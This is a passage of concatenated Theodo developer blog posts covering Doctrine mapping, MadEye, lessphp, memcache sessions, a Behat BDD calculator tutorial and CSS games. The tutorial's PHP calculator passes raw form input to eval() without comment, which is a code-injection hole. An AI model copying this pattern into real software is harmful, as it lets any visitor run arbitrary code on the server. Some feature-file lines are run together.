    public function setUploadedDocuments(ArrayCollection $uploadedDocuments)
    {
        $this->uploadedDocuments = $uploadedDocuments;

        return $this;
    }
}
                
The BlogArticle should be modified accordingly:

// src/Acme/DemoBundle/Entity/BlogArticle.php
class BlogArticle
{
    protected $id;

    protected $title;

    protected $content;

    use HasUploadedDocumentTrait;

    // [...]
}
                
Despite the use of this generic trait, the subscriber will only add the relation to the BlogArticle entity. Until now it was ok, but since we also want to attach documents to user messages we will have to customize it further by introducing a useful interface.


Make it mutliple contexts compatible
We will use an interface to detect which entity should be dynamically related to the UploadedDocument entity. Here is the contract that each entity requiring uploads will have to implement (directly extracted from the Trait mentioned above):

// src/Acme/DemoBundle/Entity/HasUploadedDocumentInterface.php
interface HasUploadedDocumentInterface
{
    public function addUploadedDocument(UploadedDocument $uploadedDocument);

    public function removeUploadedDocument(UploadedDocument $uploadedDocument);

    public function getUploadedDocuments();

    public function setUploadedDocuments(ArrayCollection $uploadedDocuments);
}
                
Therefore we refactor BlogArticle and UserMessage to implement this interface:

// src/Acme/DemoBundle/Entity/BlogArticle.php
class BlogArticle implements HasUploadedDocumentInterface
{
    // [...]

    use HasUploadedDocumentTrait;

    // [...]
}
                

// src/Acme/DemoBundle/Entity/UserMessage.php
class UserMessage implements HasUploadedDocumentInterface
{
    protected $id;

    // [...]

    use HasUploadedDocumentTrait;

    // [...]
}
                
Now we will modify the subscriber behaviour by using this interface to make the subscriber add the relation to any entity implementing it:

// src/Acme/DemoBundle/EventListener/DynamicRelationSubscriber.php
class DynamicRelationSubscriber implements EventSubscriber
{
    const INTERFACE_FQNS = 'Acme\DemoBundle\Entity\HasUploadedDocumentInterface';

    // [...]

    /**
     * @param LoadClassMetadataEventArgs $eventArgs
     */
    public function loadClassMetadata(LoadClassMetadataEventArgs $eventArgs)
    {
        // the $metadata is the whole mapping info for this class
        $metadata = $eventArgs->getClassMetadata();

        if (!in_array(self::INTERFACE_FQNS, class_implements($metadata->getName()))) {
            return;
        }

        $namingStrategy = $eventArgs
            ->getEntityManager()
            ->getConfiguration()
            ->getNamingStrategy()
        ;

        // [...]
    }
}
                
Now the subscriber implementation is reusable and it would be easy to add uploads to a third context. It would require ony the following modifications:

// src/Acme/DemoBundle/Entity/ThirdContext
class ThirdContext implements HasUploadedDocumentInterface
{
    // [...]

    use HasUploadedDocumentTrait;

    // [...]
}
                
That’s it! That’s all the ThirdContext entity require to have now a relation with the UploadedDocument.


Bring these modifications to the database
Once ORM mapping information altered dynamically, Symfony knows immediately about the modifications you made but not your database. To push these, you will just have to run the doctrine:schema:update command or to generate and run the corresponding doctrine migration.


Conclusion
Dynamic Doctrine mapping has the same functionalities as any static way. This is not a complete new way of defining ORM metadata but only a complement to the existing ones using the PHP syntax. It won’t (as explained above) automatically take care of altering the corresponding database structure but it can help you extend your entities and centralize common metadata manipulations (prefix some database tables name as shown in this doctrine documentation example) or alter metadata you statically set using reflection or whatever logic you want. I personally found it useful to set relations between cross bundle entities without bringing too many modifications to my own entities.

Related link:


http://symfony2.ylly.fr/dynamically-add-mapping-to-doctrine2-using-annotations-dantleech/





										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Charles Pourcel
  			
  				Charles Pourcel - A Web Developer who liked symfony 1.x, loves Symfony2 and keeps digging into it for new treasures. An indentation (best practices in general, we might say...) maniac? Who are you to judge!  			
  		
    
			

									"
"
										This blog post is in French as the event it relates to is French-only.
A l’occasion du Symfony Live Paris 2012, j’ai eu la chance de pouvoir faire une présentation où j’explique comment faire du Test-Drivent Development (TDD) dans un projet Symfony2 dont les slides sont disponibles sur speakerdeck. Pour ceux qui n’ont pas eu l’occasion d’y assister ou souhaitent la revoir, les vidéos du Symfony Live sont enfin sorties !

Il y avait aussi beaucoup d’autres conférences intéressantes que vous pouvez voir directement sur la chaîne Youtube de Sensiolabs.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Benjamin Grandfond
  			
  				Benjamin Grandfond - He is ""Technical Team Manager"". Symfony and PHP expert, he likes when you write your tests first and then code. His main interests are Code Quality, best practices, REST architecture and building great new PHP applications over old ones.  			
  		
    
			

									"
"
										We have a good news to announce: Benjamin Grandfond joined Mathieu Dähne and me as our third Certified Symfony Developer. He is the 40th developer to have acquired this certification! Big congratulations, as it is not an easy certificate to get. We hope that other colleagues will follow him soon, confirming our highest level of expertise in the framework.
If you wish to know more about Benjamin, checkout out his GitHub profile or follow him on Twitter.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Marek Kalnik
  			
  				Marek Kalnik - a Technical Team Manager working with us since 2010 - is a PHP and JavaScript passionate. His main centers of interests include: Symfony 2, object-oriented JavaScript, code quality and good practices.  			
  		
    
			

									"
"
										Theodo is constantly looking to improve its code review tools and collaboration. Recently we have encountered a problem about how to organize pair programming sessions with our programmers working at client’s offices. The fact that you are not in place should not prevent you from having your pair programming session with more experienced collegues!
So far we are testing MadEye which turns out quite good. I am going to show you how to install it using nvm and npm in few quick steps.

Using Node Version Manager
NVM, a Node Version Manager is a tool that helps you manage multiple NodeJS versions.
Run the following command to install it:

$ curl https://raw.github.com/creationix/nvm/master/install.sh | sh

You do not need to have NodeJS installed to run the script, but it will not work without Git. If you want to install it without using Git, see the GitHub repository for more info.
This command adds an alias to your bash config files, so you can either execute $ source ~/.profile or restart your console in order to get nvm command working.
Once NVM is installed you can install NodeJs (I have tested MadEye with Node 0.10) and NPM:

$ nvm install v0.10

Note that NPM is already bundled with Node, so no need to install it separately.
Now use NPM to install MadEye. NPM will download all dependencies automatically.

$ npm install -g madeye

Note: When using npm with nvm, you should not use sudo. All packages are installed in your home directory. If you used sudo accidentaly, change the owner of .nvm and .nmp to your user.


Usage
Just cd to your folder and type madeye. You should see something like that:

Enabling MadEye in /var/www/theodo-site
View your project at http://madeye.io/edit/{project-key}
Use Google Hangout at https://plus.google.com/hangouts/_?gid={private-id}&gd=http://madeye.io/edit/{project-key}

Once you open GoogleHangout link, Google will ask you to give MadEye the permission to run and load your project. The madeye.io link becomes inactive once you stop sharing, but the GoogleHangout keep all files readable (no saving though).
The google hangout lets you see the folder directory structure, edit files in a GoogleDocs-like manner – each hangout participant has his own color of cursor. You can then synchronize filed to the project host or discard changes if it was only a proof of concept.
So far we encounter some performance problems while opening directories on files, but the code edition in one file is realtime. Both users navigate throught files independently, it is not a simple ""screen sharing"", so some communication is required (like ""Open this file, I’ve modified that""). Saving works well, there is no server-side code update though.


Troubleshooting
MadEye does not install
See if you have the required NodeJs version, type node --version
You have installed MadEye but the madeye command is not found
If you manage multiple Node versions with NVM, it is possible that it was installed with other NodeJs version.
Run $ cd ~/.nvm && find -name madeye and see in which directory it is stored. Also check your default Node version nvm alias default and if there is none it may be a good
idea to set it.


Happy MadEying and let us know if you liked it or if you use any similar solutions!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Marek Kalnik
  			
  				Marek Kalnik - a Technical Team Manager working with us since 2010 - is a PHP and JavaScript passionate. His main centers of interests include: Symfony 2, object-oriented JavaScript, code quality and good practices.  			
  		
    
			

									"
"
										Today, we will talk about a little trick: How to use Less when node.js is not available on your server?
We will use the latest version of lessphp available at the time of writing this article. You can find the full list of tags on github : https://github.com/leafo/lessphp/tags.
Assuming Composer is already installed, run the following command from your console to complete the installation:
php composer.phar require leafo/lessphp:0.3.9
The composer require command adds lessphp package to the composer.json file from the current directory and executes a composer update command.
Then, we need to update our config file:
# app/config/config.yml
# Assetic Configuration
assetic:
    filters:
        cssrewrite: ~
        lessphp:
            apply_to: ""\.less$""
            #file:   %kernel.root_dir%/../vendor/leafo/lessphp/lessc.inc.php
Assetic will change the paths to our assets and breaks all links that use relative paths.
In order to prevent this, we use cssrewrite filter that parses CSS files and rewrites paths to reflect the new location.
We use the ‘apply_to’ option so we don’t need to specify the lessphp filter on the twig template.
‘file’ parameter is useless since this commit if we use Composer autoloading. (Thanks @stof)
Finally, you can include your less files in the template like this:
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"" />

        <title>My WebSite</title>
        {% stylesheets
            'bundles/acme/less/example.less'
        %}
            <link rel=""stylesheet"" type=""text/css"" media=""screen"" href=""{{ asset_url }}""/>
        {% endstylesheets %}
    </head>
    <body>
        {% block body%}{% endblock %}
    </body>
</html>
Because of the latency between the new lesscss feature and his implementation in php, lessphp is not as good as the latter but it is possible to use it in most situations.
You can find more information on the lessphp website: http://leafo.net/lessphp/

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Jonathan Beurel
  			
  				Jonathan Beurel - Web Developer. Twitter : @jonathanbeurel  			
  		
    
			

									"
"
										Not long ago, Theodo released it’s SessionBundle which aim is to share the session between a symfony1x and a Symfony2 website.
On a local server, very little configuration is needed to use this bundle. The sharing is available after a few minutes configuration.
When we implemented it on one website, the session sharing was working on our Vagrant box, but once it has been deployed we noticed that it was not working anymore.
The platform used by this website was configured to be able to accept more servers if needed, so the sesssion was stored on a memcache server.
We can deal with this in 3 simple steps:
1. Check the Symfony1
2. Setup the Symfony2
3. Setup the session sharing

Pre-configuration
Install the php5-memcache package using either pecl or apt-get:
apt-get install php5-memcache
pecl install memcache
Add a file in your php config directory (/etc/php5/conf.d/999.memcache.ini) to force the memcache session  torage:
session.save_handler = ""memcache""
session.save_path = ""memcache.server:11211""


Symfony 1x
Configure your application with the following directive:
memcache_enabled: true
.array:
  server_01:
    server_address: memcache.server
    server_port: 11211


Symfony 2.2
Install the TheodoEvolutionSessionBundle and follow the installation directive.
By default, Symfony2 overrides the php.ini directive to store the session.
You will have to define a service in the config.yml file to store the session in memcache:
services:
    memcache:
        class: Memcache
        calls:
            - [ addServer, [ %memcache_host%, %memcache_port% ]]
    session.handler.memcache:
        class: Symfony\Component\HttpFoundation\Session\Storage\Handler\MemcacheSessionHandler
        arguments: [ @memcache, { expiretime: %memcache_expire% } ]
You will also have to specify some arguments for the session in your config.yml file:
session:
    handler_id: %session_handler_id%
    name: frontend_session #Or put the name related to your symfony application
    save_path: %session_save_path%
    cookie_domain: %session_cookie_domain%
Put the parameters into your parameter.yml file:
memcache_host: memcache.test
memcache_port: 11211
memcache_expiretime: 86400
session_handler_id: session.handler.memcache
session_save_path: 'tcp://memcache.server:11211'
session_cookie_domain: .test.fr


Session with subdomains
If the Symfony2 webserver is accessed by a subdomain, you will need to make your session cookie from the symfony1x accessible by it.
In the factories.yml add the following configuration:
storage:
  param:
    session_domain_cookie: .test.fr
If you look deeper into the session sharing, on the symfony1x the cookie should looks like session_number
On your local server, if you list all the files in the /var/lib/php5 directory, you will see a file prefix by sess_ and followed by the session_number.
On the memcache server, there are no prefixes, so you just have to set it in your parameters.yml file:
session_prefix: ''
Note:
You cannot set the session prefix to ~, the default prefix will be used


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Nicolas Thal
  			
  				  			
  		
    
			

									"
"
										Tuesday, May 14 was held on the monthly Symfony community meetings – sfPot. We were invited to Pépinière 27 by Yoopies. As usual two talks were given and the discussions have continued in a bar.
The first lecture was a request from the community. We were asked to speak a little about tests, and Marek responded for the call. He gave a talk about the philosophy of tests in Symfony2. Value of Unit Tests and TDD in a project and he explained how simple is it to write unit tests leveraging the power of Phake – a framework for writing mocks. You can find the slides here.
The second talk, by Alexander Salomé from SensioLabs, was an introduction to Symfony2 Forms. His talk was rich in real life examples and very well prepared. It covered the basics but there was also a lot of use cases interesting even for experienced developers.
Many thanks to AFSY for organizing the event, and see you next month!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Simon Constans
  			
  				Simon Constans - Web developper for Theodo. I have been working with Symfony2 since its initial release and I keep searching for new development and design features. In short: I love Symfony2 and CSS3.  			
  		
    
			

									"
"
										We are happy to anounce that the first Theodo Evolution Bundle has been open-sourced. The SessionBundle integrates transparently Legacy PHP Sessions into Symfony2
Our team has been working for a while on the growing issue of migrating legacy applications to Symfony2, as you may have guessed from one of Fabrice Bernhard’s recent conferences at the sfLive Berlin in November or the PHP NE conference in Newcastle last month. This has led to quite a bit of knowledge through trial and errors in actual projects, and also to the development of some Symfony2 bundles.
As was announced in Berlin some of those will be open-sourced : here is the first one !
Theodo Evolution’s SessionBundle allows to properly connect your legacy application with your Symfony2 app. It uses a simplified session bag instead of arrays used by Symfony2, to allow retreiving session data kept directly in $_SESSION. The bundle has been so far used and tested on several symfony 1.x projects but it can be used in other types of projects.
Obviously, this is only a small piece, we are still going to release a bit more code later.
The Bundle is licensed MIT so feel free to use it and send us your feedback, here or directly on Github !

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Pierre-Henri Cumenge
  			
  				  			
  		
    
			

									"
"
										
Warning : This blog post uses Behat 2.5. It is not all compatible with the ~3.0 version wich should be released on 20th of april 2014.
At the beginning of the year I decided it was time to give a try to BDD. Hence every new project I started from then on was done with BDD.
I found at the time lots of documentation/tutorials on the subject, but none was exactly what I was hoping for when I begun: a standalone step-by-step tutorial that goes from installation to having tested a full user story through BDD, code samples included.
To help others get started BDD with Behat, I want to share with you such a basic tutorial. We will develop a simple calculator that takes an operation (like “1+1”) and returns a result on a web page. At the end of this post you will have a functional calculator and you should know basics to start using Behat in your projects.

Setup the project
First of all we need to install dependencies in our project, we’ll use composer to do so:
# composer.json
{
    ""autoload"": {
        ""psr-0"": { ""Calculator"": ""src/"" }
    },
    ""require"": {
        ""behat/behat"": ""*"",
        ""behat/mink-extension"": ""*"",
        ""behat/mink-goutte-driver"": ""*""
    },
    ""minimum-stability"": ""dev"",
    ""config"": {
        ""bin-dir"": ""bin""
    }
}
Then install Composer (“curl -s https://getcomposer.org/installer | php”) and run “php composer.phar install”. Note that we also installed Mink and Goutte, that will allow us to easily test our web application.


Your first feature
A feature is a file that describes scenarios step by step.
To initialize our suite of features run the following command:
~/calculator $ bin/behat --init
+d features - place your *.feature files here
+d features/bootstrap - place bootstrap scripts and static files here
+f features/bootstrap/FeatureContext.php - place your feature related code here
Once the “features” folder is created you can start writing your features. Create a file “calculator feature” in your “features” dir:
#features/calculator.feature
Feature: Calculator calculates operations and returns it to you

    Scenario: Calculate 1+1 and return 2
        Given I am on ""/index.php""
        When I fill in ""operation"" with ""1+1""
        And I press ""Ok""
        Then I should see ""2"" in the ""#result"" element
This needs some explanations. The first line contains the name of the feature after the keyword “Feature”.
Then we wrote the first scenario of the feature right after the ‘Scenario’ keyword and gave it a name. As in this example, you can add a description of your scenario. Then we added the steps of the scenario describing what happens. Each step is prefixed by a keyword “Given”, “When”, “And” and “Then”, this allows the scenario to be readable by both a human being and Behat.
Note: See the Gherkin language documentation on Behat’s website.
Ok, once the feature is written, we want to run behat to see the scenario fail:
~/calculator $ bin/behat
Feature: Calculator calculates operations and returns it to you

  Scenario: Calculate 1+1 and return 2 # features/calculator.feature:3
    Given I am on ""/index.php""
    When I fill in ""operation"" with ""1+1""
    And I press ""Ok""
    Then I should see ""2"" in the ""#result"" element

1 scenario (1 undefined)
4 steps (4 undefined)
0m0.015s

You can implement step definitions for undefined steps with these snippets:

/**
 * @Given /^I am on ""([^""]*)""$/
 */
public function iAmOn($arg1)
{
    throw new PendingException();
}

/**
 * @When /^I fill in ""([^""]*)"" with ""([^""]*)""$/
 */
public function iFillInWith($arg1, $arg2)
{
    throw new PendingException();
}

/**
 * @Given /^I press ""([^""]*)""$/
 */
public function iPress($arg1)
{
    throw new PendingException();
}

/**
 * @Then /^I should see ""([^""]*)"" in the ""([^""]*)"" element$/
 */
public function iShouldSeeInTheElement($arg1, $arg2)
{
    throw new PendingException();
}
Behat told you a lot of interesting stuff… let’s decompose it. First, it tells you that he cannot understand so far the step we gave it: you need to define what “I am on” means, for instance.
Then it generates templates to help you write your step definitions. Most of the time you will copy/paste these templates in your context class generated in the feature/bootstrap/FeatureContext.php file. Luckily, MinkExtension provides these definitions with the MinkContext class, so lets use it.
Before going further we will have to configure Behat through the behat.yml file:
# behat.yml
default:
    extensions:
        Behat\MinkExtension\Extension:
            base_url: 'http://127.0.0.1:4042' # this will be the url of our application
            goutte: ~
Then register the MinkContext as a subcontext in the FeatureContext class that Behat generated for you:
// features/bootstrap/FeatureContext.php
...
use Behat\MinkExtension\Context\MinkContext;

/**
 * Features context.
 */
class FeatureContext extends BehatContext
{
    /**
     * Initializes context.
     * Every scenario gets it's own context object.
     *
     * @param array $parameters context parameters (set them up through behat.yml)
     */
    public function __construct(array $parameters)
    {
        $this->useContext('mink', new MinkContext());
    }
}
Now if we run “bin/behat -dl” we will see the list of step definitions that our context is aware of.
Then running “bin/behat” you should see the first step fail:
Feature: Calculator calculates operations and returns it to you

  Scenario: Calculate 1+1 and return 2             # features/calculator.feature:3

    Given I am on ""/index.php""                     # Behat\MinkExtension\Context\MinkContext::visit()
      [curl] 7: couldn't connect to host [url] http://127.0.0.1:4042/index.php
    When I fill in ""operation"" with ""1+1""          # Behat\MinkExtension\Context\MinkContext::fillField()
    And I press ""Ok""                               # Behat\MinkExtension\Context\MinkContext::pressButton()
    Then I should see ""2"" in the ""#result"" element # Behat\MinkExtension\Context\MinkContext::assertElementContainsText()

1 scenario (1 failed)
4 steps (3 skipped, 1 failed)
0m0.031s
To make the first step pass we have to make the “/index.php” url point to a real index.php file. Then you have to make Behat (throught Mink and Goutte) able to access this file. To do so you can setup a virtual host, but if you don’t want to spend most of your time setting it up you should open another tab in your console, download Symfttpd and add the following symfttpd.conf.php file in your project:
<?php
// symfttpd.conf.php

$options['project_type'] = 'php';
$options['project_web_dir'] = '.';
Note that you will need Lighttpd to be installed on your machine (to use Nginx with PHP-FPM run the command “path/to/symfttpd/bin/symfttpd init”).
Once Symfttpd is configured, run the following command:
~/calculator $ php symfttpd.phar spawn -t
Symfttpd - version 2.1.4
lighttpd started on 127.0.0.1, port 4042.

Available applications:
http://127.0.0.1:4042/index.php

Press Ctrl+C to stop serving.
If everything is going right you can now run the scenario again:
~/calculator $ bin/behat
Feature: Calculator calculates operations and returns it to you

  Scenario: Calculate 1+1 and return 2 # features/calculator.feature:3
    Given I am on ""/index.php"" # Behat\MinkExtension\Context\MinkContext::visit()
    When I fill in ""operation"" with ""1+1"" # Behat\MinkExtension\Context\MinkContext::fillField()
    Form field with id|name|label|value ""operation"" not found.
    And I press ""Ok"" # Behat\MinkExtension\Context\MinkContext::pressButton()
    Then I should see ""2"" in the ""#result"" element # Behat\MinkExtension\Context\MinkContext::assertElementContainsText()

1 scenario (1 failed)
4 steps (1 passed, 2 skipped, 1 failed)
0m1.154s
Now the first step is green, this means it passed, but the second one failed: “Form field with id|name label|value “operation” not found.” It means that we have some minimal code to write.


Green bar
In TDD we follow simple rules:


write a simple test
run all tests and fail
make a change
run the tests and succeed
finally refactor


The first step is already done since we wrote our scenario, and as we ran it and saw it fail step two is already done as well. Let’s make a change then.
To make the scenario succeed we need to write some html in the index.php file:
<html>
        <body>
                <form action=""/"" method=""post"">
                        <input type=""text"" name=""operation"" />
                        <button type=""submit"">Ok</button>
                </form>
        </body>
</html>
Then run Behat again:
~/calculator $ bin/behat
Feature: Calculator calculates operations and returns it to you

  Scenario: Calculate 1+1 and return 2             # features/calculator.feature:3
    Given I am on ""/""                              # Behat\MinkExtension\Context\MinkContext::visit()
    When I fill in ""operation"" with ""1+1""          # Behat\MinkExtension\Context\MinkContext::fillField()
    And I press ""Ok""                               # Behat\MinkExtension\Context\MinkContext::pressButton()
    Then I should see ""2"" in the ""#result"" element # Behat\MinkExtension\Context\MinkContext::assertElementContainsText()
    Element matching css ""#result"" not found.

1 scenario (1 failed)
4 steps (3 passed, 1 failed)
0m0.048s
Two steps closer to success! The latest step is still failing, so to make it pass we will complete our HTML with hardcoded value (remember the TDD philosophy: find the simplest way to make the tests pass):
<html>
        <body>
                <form action=""/"" method=""post"">
                        <input type=""text"" name=""operation"" />
                        <button type=""submit"">Ok</button>
                </form>

                <div id=""result"">2</div>
        </body>
</html>
Then … you guessed it… run Behat:
~/calculator $ bin/behat
Feature: Calculator calculates operations and returns it to you

  Scenario: Calculate 1+1 and return 2             # features/calculator.feature:3
    Given I am on ""/""                              # Behat\MinkExtension\Context\MinkContext::visit()
    When I fill in ""operation"" with ""1+1""          # Behat\MinkExtension\Context\MinkContext::fillField()
    And I press ""Ok""                               # Behat\MinkExtension\Context\MinkContext::pressButton()
    Then I should see ""2"" in the ""#result"" element # Behat\MinkExtension\Context\MinkContext::assertElementContainsText()

1 scenario (1 passed)
4 steps (4 passed)
0m0.041s
Green bar!! Ok this was the fourth step of our TDD process (run the tests and succeed), easy isn’t it?!
To go further we need to think about our calculator. Adding 1 to 1 was simple and we did it quite easily, but what if we want to add 2 to 3? Write the feature:
# feature/calculator.feature# ...Scenario: Calculate 2+3 and return 5
        Given I am on ""/""When I fill in ""operation"" with ""2+3""And I press ""Ok""Then I should see ""5"" in the ""#result"" element
Of course, running Behat again, this scenario will fail as we hardcoded the result in our HTML. So we will need to change it without breaking the first scenario…
Here is the code:
<?php

$result = """";

// The operation was submitted
if (!empty($_POST)) {
        $operation = $_POST['operation'];

        $result = eval(""return $operation;"");
}

?>

<html>
        <body>
                <form action=""/"" method=""post"">
                        <input type=""text"" name=""operation"" />
                        <button type=""submit"">Ok</button>
                </form>

                <div id=""result""><?php echo $result ?></div>
        </body>
</html>
Running Behat, everything is ok.


Does your calculator do something else than addition?
Yes! I will prove it! Add the following scenarios and run Behat again:
# features/calculator.featureFeature:

    # ...

    Scenario: Calculate 10-5 and return 5
        Given I am on ""/""
        When I fill in ""operation"" with ""10-5""And I press ""Ok""Then I should see ""5"" in the ""#result"" elementScenario: Calculate 2*3 and return 6
        Given I am on ""/""When I fill in ""operation"" with ""2*3""And I press ""Ok""Then I should see ""6"" in the ""#result"" elementScenario: Calculate 4/2 and return 2
        Given I am on ""/""When I fill in ""operation"" with ""4/2""And I press ""Ok""Then I should see ""2"" in the ""#result"" element
~/calculator $ bin/behat --format=progress
................................

5 scenarios (5 passed)
20 steps (20 passed)
0m0.155s
So yes, our calculator can add, substract, multiply and divide.


Refactor: step 5 of TDD
Adding scenarios for each type of calculation we duplicate steps, let’s see how to keep our feature small but readable, using Scenario outlines:
Feature: Calculator calculates operations and returns it to you

    Scenario Outline: Calculate an operation and print the result
        Given I am on ""/""
        When I fill in ""operation"" with ""<operation>""And I press ""Ok""Then I should see ""<result>"" in the ""#result"" elementExamples:
        | operation | result |        | 1+1       | 2      |        | 2+3       | 5      |        | 10-5      | 5      |        | 2*3       | 6      |        | 4/2       | 2      |
Run Behat:
~/calculator $ bin/behat --format=progress
............................

5 scenarios (5 passed)
20 steps (20 passed)
0m0.135s
Much cleaner, isn’t it? Yes, but we can improve its quality a little bit more. We tested that 1+1 equals 2 and 2+3 equals 5, we can remove one of these examples as it is quite the same.


Up to you!
If you want to go further you may add some functionalities to our Calculator. Improve the web interface, add buttons, separate view from controller…
Here are some links to go further with Behat, Mink and Gherkin.
Finally, if you are interested in BDD you should read this now classic blog post from Dan North’s blog and to learn more about TDD you should read the “Test-Driven Development by example” by Kent Beck.
Hope this article will help you start with Behat on your next PHP project!



										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Benjamin Grandfond
  			
  				Benjamin Grandfond - He is ""Technical Team Manager"". Symfony and PHP expert, he likes when you write your tests first and then code. His main interests are Code Quality, best practices, REST architecture and building great new PHP applications over old ones.  			
  		
    
			

									"
"
										<!--
#content .storycontent h2,
#content .storycontent h3 {
	margin: 2em 0 1em;
	line-height: normal;
}
#content div.article .illustration {
	margin: 0 auto;
	display: block;
}
#content div.article p {
	margin-bottom: 1em;
	line-height: 1.4em;
}
#content div.article pre {
	margin-bottom: 1.4em;
}
#content div.article pre.error {
	color: #f00;
}
#content div.article pre .comment {
	color: #999;
}
.gimme-more {
	max-height: 200px;
	overflow: hidden;
	transition:max-height 1.2s;
}
.gimme-more:hover {
	max-height: 900px;
}
.gimme-more:before {
	content: '↓ hover for more ↓';
	display: block;
        padding-bottom: 2px;
        border-bottom: 1px dashed #ccc;
        margin-bottom: 10px;
	text-align: center;
        color: #aaa;
}
-->
The development of CSS3 and its improving support in “modern” browsers brought us crazy JavaScript-free animations featuring gradients, rotations, 3D and way too many iStuff.
These visual experiments are certainly nice but I started searching for ways of adding interactivity to go one step further and make games using only CSS.
This is precisely when I stumbled upon Alex Walker’s CSS3 Pong demo.
It may not be a real game but let’s be clear: if it’s a game you want to make, do not use CSS. However if you want to play with CSS and share the fun, it’s ok!
So now we’ll talk about the first (more incoming) game I made: Click Invaders.

Pseudo-classes as Events
For a first game I kept it simple and went for a basic mouse shooter.
In Click Invaders, you click an enemy to kill it.
The click event is easy to capture with JavaScript but not with a decoration language like CSS. Instead we’ll use the :checked pseudo-class and style the normal and checked states of an input, here a checkbox.
That’s right, in Click Invaders you are actually filling a form, not destroying monsters from outer space 😀
Since we can’t style checkboxes that much, the invader is going to be the label corresponding to the input via the for/id attributes.

HTML
<div class=""invader one"">
	<input id=""invader-one"" type=""checkbox"" />
	<label for=""invader-one""></label>
</div>
CSS
/* the red bean body */
.invader label {
	display: block;
	width: 40px;
	height: 40px;
	line-height: 40px;
	padding: 10px;
	background: red;
	border-radius: 50%;
	box-shadow: 0 0 20px red;
}

/* the eyes */
.invader label:before,
.invader label:after {
	content: '';
	display: block;
	position: absolute;
	top: 16px;
	width: 10px;
	height: 10px;
	background: yellow;
	border-radius: 50%;
}
.invader label:before {left: 16px;}
.invader label:after {right: 16px;}

/* the input, hidden somewhere in a galaxy far away */
.invader input {
	position: absolute;
	top: -9999px;
	left: -9999px;
}
When we click the label, it triggers and checks the input. And when the input is checked, we hide the label, hence the invader disappears.
/* R.I.P. */
.invader input:checked + label {
  display: none;
}
Advanced selectors
Notice the use of the adjacent sibling combinator (+). Inputs don’t have children, therefore we can’t do something like:
/* impossible */
input:checked label {
  display: none;
}
But we can’t target a parent tag either. So we need the label right after the input, on the same level, and use the + selector that does exactly this: target the next element.
So now we can make our enemies disappear. Not cool enough!
What we want is to blast the hell out of every invader we kill: let’s explode them!
The plan here is to hide the explosion and make it appear only after the kill (after the input is checked, that is).

HTML
<div class=""invader one"">
    <input id=""invader-one"" type=""checkbox"" />
    <label for=""invader-one""></label>
    <div class=""explosion""><span>Bam!</span></div>
</div>
CSS
/* explosions are twelve-point-stars from www.css3shapes.com */
.explosion .explosionBase {
  width: 300px;
  height: 300px;
  background: yellow;
  box-shadow: 0 0 20px yellow;
  position: absolute;
}

.explosion:before,
.explosion:after {
  width: 300px;
  height: 300px;
  background: yellow;
  box-shadow: 0 0 20px yellow;
  position: absolute;
  content: """";
}
.explosion:before {transform: rotate(30deg);}
.explosion:after {transform: rotate(-30deg);}

.explosion span {
  position: absolute;
  top: 130px;
  left: 0;
  z-index: 3;
  display: block;
  width: 300px;
  height: 300px;
  font-size: 48px;
  text-align: center;
  text-transform: uppercase;
  user-select: none;
}

/* KABOOM baby */
.invader input:checked ~ .explosion {
  display: block;
}
In essence, that’s exactly the same as we’ve seen before except we use the general sibling combinator (~).
It is a more powerful version of the + selector that can target any element positioned after the first element and at the same level.
In that regard, wrapping my invaders inside a div.invader was actually a bad idea since the more “flat” your HTML structure is, the more efficient your selectors will be.
Animations
That does look better but at this point we’re lacking something essential: those invaders, they need to fly!
Chances are that you are already familiar with CSS3 animations yet I think one important reminder is due: IE9 don’t handle them.
To be honest, I had initially planned to have a distinct flying animation for each invader (there are 5) but I got lazy so I settled for one zigzag animation and applied different delay and direction values:
CSS
.invader label {
	/* name, duration, iteration (same for all invaders) */
	animation: fly 14s infinite;
}

.invader.three label {
	/* specific delay and direction */
	animation-delay: 3s;
	animation-direction: alternate, normal;
}

/* position and deformation at different steps */
@keyframes fly {
	0% {
		top: 0;
		left: -20%;
		padding: 0 20px;
	}
	25% {
		top: 40px;
		left: 120%;
		padding: 10px;
	}
	50% {
		top: 30%;
		left: -20%;
		padding: 0 20px;
	}
	75% {
		top: 50%;
		left: 120%;
		padding: 10px;
	}
	100% {
		top: 80%;
		left: -20%;
		padding: 0 20px;
	}
}
To infinity and beyond!
Here we are, we have reached a point where we can actually say that we build a “game”.
Granted, it’s not a very interesting game but I warned you earlier^^
Click Invaders also features Start screen, a timer and more decorative elements such as stars, buildings and lights.
It can (and will) be largely improved using various CSS tricks though most of it should follow the following formula: pseudo-class + selector + animation.
Keep in mind that CSS3 is in constant evolution and so is its actual support in browsers so you’ll probably need to use prefixes (-webkit-, -moz-, -o-, -ms-) when implementing uncommon CSS3 properties.
To help you with that I advise you use prefixfree or a CSS preprocessor like LESS.
Other resources: Can I use…, Taming Advanced CSS Selectors, Mozilla Developer Network.
Hopefully the things we’ve seen are not limited to CSS games. For instance, it can be used to replace some minor JavaScript effects just like I did in this very article with the “hover for more” blocks that use the :hover pseudo-class, or custom ON/OFF switches.
Thanks for reading, I’ll make sure to keep you updated!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Cyrille Jouineau
  			
